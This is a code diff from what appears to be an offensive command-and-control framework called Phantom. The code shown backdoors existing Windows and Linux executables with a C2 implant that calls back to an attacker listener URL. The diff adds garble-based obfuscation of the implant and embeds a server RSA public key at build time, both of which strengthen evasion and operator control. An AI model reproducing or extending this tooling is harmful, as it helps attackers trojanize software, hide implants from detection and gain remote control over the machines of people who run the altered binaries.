@@ -19,6 +19,8 @@ type BinaryBackdoorConfig struct {
 	ListenerURL  string // C2 callback URL
 	AgentBinary  string // Path to compiled Phantom agent (optional — will build if empty)
 	Method       string // "append", "section", "cave" (PE), "segment" (ELF)
+	Obfuscate    bool   // Use garble for agent compilation
+	ServerPubKey string // Base64 DER RSA public key (embedded in agent)
 }
 
 // BackdoorBinary injects a Phantom agent into an existing executable.
@@ -39,7 +41,7 @@ func BackdoorBinary(cfg BinaryBackdoorConfig) (string, error) {
 	agentPath := cfg.AgentBinary
 	if agentPath == "" {
 		var buildErr error
-		agentPath, buildErr = buildAgent(cfg.ListenerURL, detectOS(inputData))
+		agentPath, buildErr = buildAgentCfg(cfg.ListenerURL, detectOS(inputData), cfg.Obfuscate, cfg.ServerPubKey)
 		if buildErr != nil {
 			return "", fmt.Errorf("failed to build agent: %w", buildErr)
 		}
@@ -424,6 +426,10 @@ func detectOS(data []byte) string {
 }
 
 func buildAgent(listenerURL, targetOS string) (string, error) {
+	return buildAgentCfg(listenerURL, targetOS, false, "")
+}
+
+func buildAgentCfg(listenerURL, targetOS string, obfuscate bool, serverPubKey string) (string, error) {
 	root := "."
 	if home, err := os.UserHomeDir(); err == nil {
 		candidate := filepath.Join(home, "phantom")
@@ -432,23 +438,57 @@ func buildAgent(listenerURL, targetOS string) (string, error) {
 		}
 	}
 
-	outName := "phantom-agent_" + targetOS + "_amd64"
+	suffix := ""
+	if obfuscate {
+		suffix = "_garbled"
+	}
+	outName := "phantom-agent_" + targetOS + "_amd64" + suffix
 	if targetOS == "windows" {
 		outName += ".exe"
 	}
 	outPath := filepath.Join(root, "build", "agents", outName)
 
-	// Check if already built
-	if _, err := os.Stat(outPath); err == nil {
-		return outPath, nil
+	// Re-use cached non-obfuscated build only when no pubkey override
+	if !obfuscate && serverPubKey == "" {
+		if _, err := os.Stat(outPath); err == nil {
+			return outPath, nil
+		}
 	}
 
-	// Build it
-	ldflags := fmt.Sprintf("-s -w -X 'github.com/phantom-c2/phantom/internal/implant.ListenerURL=%s'", listenerURL)
-	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-o", outPath, "./cmd/agent")
-	cmd.Dir = root
-	cmd.Env = append(os.Environ(), "GOOS="+targetOS, "GOARCH=amd64", "CGO_ENABLED=0")
+	module := "github.com/phantom-c2/phantom/internal/implant"
+	ldflags := fmt.Sprintf("-s -w -X '%s.ListenerURL=%s'", module, listenerURL)
+	if serverPubKey != "" {
+		ldflags += fmt.Sprintf(" -X '%s.ServerPubKey=%s'", module, serverPubKey)
+	}
 
+	os.MkdirAll(filepath.Join(root, "build", "agents"), 0755)
+	env := append(os.Environ(), "GOOS="+targetOS, "GOARCH=amd64", "CGO_ENABLED=0")
+
+	if obfuscate {
+		// Try garble first
+		garblePath := ""
+		for _, g := range []string{"garble", filepath.Join(os.Getenv("HOME"), "go", "bin", "garble"), "/usr/local/bin/garble"} {
+			if p, err := exec.LookPath(g); err == nil {
+				garblePath = p
+				break
+			}
+		}
+		if garblePath != "" {
+			cmd := exec.Command(garblePath, "-literals", "-tiny", "-seed=random",
+				"build", "-ldflags", ldflags, "-o", outPath, "./cmd/agent")
+			cmd.Dir = root
+			cmd.Env = append(env, "GOTOOLCHAIN=local")
+			if _, err := cmd.CombinedOutput(); err == nil {
+				return outPath, nil
+			}
+		}
+		// Garble unavailable — fall back to stripped build
+		ldflags += " -s -w"
+	}
+
+	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", ldflags, "-o", outPath, "./cmd/agent")
+	cmd.Dir = root
+	cmd.Env = env
 	if output, err := cmd.CombinedOutput(); err != nil {
 		return "", fmt.Errorf("agent build failed: %s", strings.TrimSpace(string(output)))
 	}
